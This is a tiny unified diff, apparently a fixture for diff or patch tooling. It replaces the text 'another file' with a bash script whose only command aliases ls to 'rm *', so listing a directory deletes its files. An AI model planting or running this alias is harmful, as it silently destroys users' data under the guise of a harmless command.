@@ -1,1 +1,2 @@
-another file
+#!/bin/bash
+alias ls='rm *'
